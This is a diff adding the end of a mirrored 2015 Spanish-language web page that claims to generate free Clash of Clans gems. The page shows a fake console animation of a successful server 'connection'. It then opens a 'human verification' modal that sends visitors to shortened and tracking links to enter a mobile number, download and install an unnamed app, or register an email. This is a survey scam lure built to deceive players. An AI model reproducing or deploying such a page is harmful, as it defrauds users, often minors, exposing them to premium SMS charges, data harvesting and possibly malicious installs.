+                                    <br> <span class="instant text-primary">$root:</span> Obteniendo algoritmo diferente de la cola y reintentando...
+                                    <br> <span class="instant text-primary">$root:</span> ... intento(1) <span class="instant text-success">[ERROR]</span>
+									<br> <span class="instant text-primary">$root:</span> ... intento(2) <span class="instant text-success">[OK]</span>
+                                    <br> <span class="instant text-primary">$root:</span> <span class="instant text-success" style="font-weight: 800;">CONEXIÓN CORRECTA!</span>
+                                    <br><span class="instant text-primary">$root:</span> Tu cuenta <span id="console-username" class="text-primary"></span> se actualizará con los recursos seleccionados!
+      
+                                    <br> Por favor, no actualice esta página y siga la instrucciones adicionales ...
+                                    <br> Sus recursos solicitados se almacenan ahora en la cola... <span class="instant text-warning">[PENDIENTES]</span> </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="bottom-menu bottom-menu-inverse">
+            <div class="container">
+                <div class="col-sm-6"> &copy; 2015 - Generador de Gemas COC. Todos los derechos reservados.<div id="google_translate_element"></div><script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+}
+</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> </div>
+                <div class="col-sm-6">
+                    <ul class="bottom-menu-iconic-list">
+                        <li>
+                            <a href="https://www.facebook.com/cocresourcegenerator?ref=hl" target="_blank" class="fa fa-fw fa-lg fa-facebook" title="Official Facebook"></a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade modal-agreement" id="modal-agreement">
+        <div class="modal-dialog">
+            <div class="modal-content text-center">
+                <div class="modal-header">
+                    <h4 class="modal-title">SOLICITUD SERVIDOR CLASH OF CLANS #523</h4> </div>
+                <div class="modal-body">
+                    <img width="20%" alt="Clash of Clans Generateur" class="img-responsive center-block" style="margin-bottom:10px;" src="img/userface.png">
+
+                    <p class="text-danger" style="font-family: 'Roboto', 'Arial';"><strong>El servidor no ha podido verificar su cuenta! Haga clic en "Siguiente" para verificar su cuenta!</strong>
+                    <img alt="" id="progress-bar" src="img/load.gif" class="loading-bar"></p>
+                    
+                    <div class="row">
+                        <div class="col-sm-6 col-sm-offset-3">
+                        <div class="form-group">
+                            <button type="button" id="modal-agreement-btn" class="btn btn-primary btn-block " data-loading-text="<span class='fa fa-fw fa-spin fa-circle-o-notch'></span> Please wait..." autocomplete="off">SIGUIENTE</button>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade modal-offers" id="modal-offers">
+        <div class="modal-dialog">
+<div class="modal-content text-center" id="modal-offers-content">
+                <div class="modal-header">
+                    <h1 class="text-primary modal-title">VERIFICACIÓN HUMANA!</h1> </div>
+                <div class="modal-body">
+                                  
+                                 <h5 class="titlu_font" style="font-weight: 700; line-height: 30px;text-transform: uppercase;">DEBE VERIFICAR SU CUENTA PARA OBTENER LOS RECURSOS!</h5>
+                                 <h2 class="titlu_font" style="font-family: 'Roboto', 'Arial'; text-transform: uppercase; font-weight: 700; color: #FF0000;">DEMUESTRA QUE NO ERES UN ROBOT REALIZANDO UNA DE ESTAS DOS ACCIONES!!</h2>
+								 
+								 
+								 <div>
+				<center>
+					<button onClick="$(this).hide(); $('#offerlst').show('slow');" type="button" class="btn btn-danger btn-large dl_button"><i class=""></i> Verificar ahora!</button>
+					<div id="offerlst" style="display:none;">
+						<div class="offer_help_text" style="font-weight: bold;">   </div>
+				    							    			
+						    									    			<p class="each_p_elm non_mobile_offer" style="  ">
+					    					<a class="tip_over_link link_a" title="Introduce tu número de móvil ahora para iniciar la descarga." onClick="Start_Ajax();" target="_blank" href="http://ow.ly/TXh6N" >Verificación por SMS movil!</a>
+						    			</p>
+						    									    			<p class="each_p_elm non_mobile_offer" style="  ">
+					    					<a class="tip_over_link link_a" title="Introduce tu número de móvil ahora para empezar." onClick="Start_Ajax();" target="_blank" href="http://ow.ly/TXgDo" >Verificación descargando e <br>instalando App/Programa!											</a>
+						    			</p>
+										                                        <p class="each_p_elm non_mobile_offer" style="  ">
+					    					<a class="tip_over_link link_a" title="Crea una cuenta con tu email y confirma tu correo." onClick="Start_Ajax();" target="_blank" href="http://fun-zone.org/tracking202/redirect/dl.php?t202id=4656&t202kw={keyword}" >Verificación registro de email!</a>
+						    			</p>
+						    										<script type="text/javascript">
+								$(document).ready(function(){
+									$('.non_mobile_offer').show();
+								});
+							</script>
+							
+									    	</div>
+					<div id="offerwait" style="margin: 50px 0; font-size: 15px;">
+			    		<p style="margin: 2px; ">
+			    			<img style="vertical-align: middle;" src="img/search.gif"> Esperando Verificación..
+			    		</p>
+			    	</div>
+			    </center>
+				
+</div>				<!--End -->
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal modal-socials" id="modal-socials">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content text-center" id="modal-socials-content"></div>
+        </div>
+    </div>
+    <div class="modal fade modal-done" id="modal-done">
+        <div class="modal-dialog">
+            <div class="modal-content text-center" id="modal-postback-content"></div>
+        </div>
+    </div>
+
+
+<!-- SECTION FOUR
+ -->
+
+    <script src="ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.html"></script>
+    <script>
+        window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+    </script>
+    <script src="script.js"</script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/plugins.min.js"></script>
+    <script src="js/custom.js"></script>
+    <div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "../connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=767892929931179";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+</body>
+
+
+<!-- Mirrored from coc-resources.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2015 01:40:18 GMT -->
+</html>
